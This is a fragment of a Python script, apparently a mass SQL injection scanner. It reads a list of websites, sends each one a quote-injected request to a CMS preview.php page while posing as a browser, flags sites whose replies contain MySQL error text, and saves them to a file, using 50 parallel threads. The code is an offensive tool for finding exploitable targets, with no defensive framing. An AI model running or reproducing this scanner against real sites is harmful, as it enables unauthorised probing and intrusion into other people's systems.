...
try:
	...
	print ('[+]================> ' + 'USAGE '+sys.argv[0]+' listsite.txt')
	pass
ooo = list((ooo))
##########################################################################################
def sql(url):
	try:
		payload = url + '/CMS/preview.php?id=1%27'
		ss = requests.session()
		Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
		ktn1 = ss.get(payload, headers=Agent, verify=False, timeout=20, allow_redirects=False)
		#print ktn1.text
		if 'MySQL query' in ktn1.content:
			print (ktngreen + 'SITE VULN : ' + url + CEND)
			open('sql.txt','a').write(payload+'\n')
			pass
		else:
...
def Main():
	try:
		...
		start = timer()
		ThreadPool = Pool(50)
		Threads = ThreadPool.map(sql, ooo)
